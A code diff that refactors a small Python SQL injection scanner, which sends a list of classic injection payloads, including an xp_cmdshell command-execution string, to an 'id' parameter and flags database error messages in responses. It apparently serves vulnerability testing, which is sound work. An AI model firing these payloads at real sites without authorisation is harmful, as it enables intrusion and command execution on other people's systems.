@@ -1,12 +1,9 @@
 import requests
 
-class SecurityTester:
-    def __init__(self, base_url):
-        self.base_url = base_url
-
-    def check_sql_injection(self, param_name, payload):
+class SQLInjectionTest:
+    def __init__(self, param_name, payload, error_messages):
         """
-        Checks if a parameter is vulnerable to SQL injection.
+        Initialize the SQLInjectionTest object.
 
         Parameters
         ----------
@@ -14,21 +11,57 @@ class SecurityTester:
             The name of the parameter to test.
         payload : str
             The SQL injection payload to use.
+        error_messages : list
+            A list of common SQL error messages to detect.
+        """
+        self.param_name = param_name
+        self.payload = payload
+        self.error_messages = error_messages
+
+    def run_test(self, base_url):
+        """
+        Run the SQL injection test.
+
+        Parameters
+        ----------
+        base_url : str
+            The base URL of the website to test.
 
         Returns
         -------
         bool
             True if the parameter is likely vulnerable, False otherwise.
         """
-        print(f"Testing {param_name} for SQL injection with payload: {payload}")
+        print(f"Testing {self.param_name} for SQL injection with payload: {self.payload}")
         vulnerable = False
-        # Construct the URL with the SQL injection payload
-        target_url = f"{self.base_url}?{param_name}={payload}"
+        target_url = f"{base_url}?{self.param_name}={self.payload}"
         print(f"Requesting URL: {target_url}")
         response = requests.get(target_url)
 
-        # Check for common SQL injection error messages in the response
-        error_messages = [
+        for error in self.error_messages:
+            if error.lower() in response.text.lower():
+                print(f"Potential SQL Injection Vulnerability found with payload: {self.payload}")
+                vulnerable = True
+                break
+
+        if not vulnerable:
+            print(f"No SQL Injection vulnerability detected with payload: {self.payload}")
+
+        return vulnerable
+
+
+class SecurityTester:
+    def __init__(self, base_url):
+        """
+        Initialize the SecurityTester object.
+
+        Parameters
+        ----------
+        base_url : str
+            The base URL of the website to test.
+        """
+        self.base_url = base_url
+        self.error_messages = [
             "you have an error in your sql syntax;",
             "unclosed quotation mark after the character string",
             "warning: mysql",
@@ -37,24 +70,7 @@ class SecurityTester:
             "syntax error",  # Generic SQL syntax error
             "Microsoft OLE DB Provider for SQL Server"  # MS SQL Server error
         ]
-
-        for error in error_messages:
-            if error.lower() in response.text.lower():
-                print(f"Potential SQL Injection Vulnerability found with payload: {payload}")
-                vulnerable = True
-                break
-
-        if not vulnerable:
-            print(f"No SQL Injection vulnerability detected with payload: {payload}")
-
-        return vulnerable
-
-    def run_tests(self):
-        """
-        Run security tests on the website.
-        """
-        # List of SQL injection payloads
-        sql_payloads = [
+        self.sql_payloads = [
             "' OR '1'='1",  # Classic SQL Injection
             "' OR '1'='1' --",  # SQL Injection with comment
             "' OR '1'='1' /*",  # SQL Injection with block comment
@@ -67,13 +83,28 @@ class SecurityTester:
             "'; EXEC xp_cmdshell('dir'); --",  # SQL Server command execution
         ]
 
-        # Test SQL injection on a specific parameter
-        for payload in sql_payloads:
-            self.check_sql_injection("id", payload)
+    def add_custom_payload(self, payload):
+        """
+        Add a custom SQL injection payload to the test suite.
+
+        Parameters
+        ----------
+        payload : str
+            The custom SQL injection payload to add.
+        """
+        self.sql_payloads.append(payload)
+
+    def run_all_tests(self):
+        """
+        Run all SQL injection tests.
+        """
+        for payload in self.sql_payloads:
+            test = SQLInjectionTest(param_name="id", payload=payload, error_messages=self.error_messages)
+            test.run_test(self.base_url)
 
 
 # EXAMPLE USAGE
 if __name__ == "__main__":
     # Replace 'http://example.com/page' with the actual URL to test
     tester = SecurityTester("http://example.com/page")
-    tester.run_tests()
+    tester.run_all_tests()
